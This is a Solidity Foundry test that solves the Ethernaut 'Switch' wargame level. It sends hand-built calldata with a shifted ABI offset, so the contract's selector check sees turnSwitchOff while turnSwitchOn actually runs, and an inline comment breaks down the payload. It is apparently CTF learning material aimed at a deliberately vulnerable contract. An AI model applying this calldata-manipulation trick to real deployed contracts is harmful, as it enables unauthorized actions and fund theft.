pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../src/ethernaut/core/Ethernaut.sol";
import "../src/ethernaut/29-Switch/Switch.sol";
import "../src/ethernaut/29-Switch/SwitchFactory.sol";

contract SwitchTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        //setup
        ethernaut = new Ethernaut();
    }

    function testAttck() public {
        SwitchFactory factory = new SwitchFactory();
        ethernaut.registerLevel(factory);
        address levelAddress = ethernaut.createLevelInstance(factory);

        Switch level = Switch(levelAddress);

        level.flipSwitch(abi.encodeWithSelector(Switch.turnSwitchOff.selector));

        // 0x
        // 30c13ade 
        // 0000000000000000000000000000000000000000000000000000000000000060 offset  
        // 0000000000000000000000000000000000000000000000000000000000000004 length
        // 20606e1500000000000000000000000000000000000000000000000000000000 turnSwitchOff
        // 0000000000000000000000000000000000000000000000000000000000000004 length
        // 76227e1200000000000000000000000000000000000000000000000000000000 turnSwitchOn

        levelAddress.call(hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000");



        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(levelSuccessfullyPassed);
    }
}
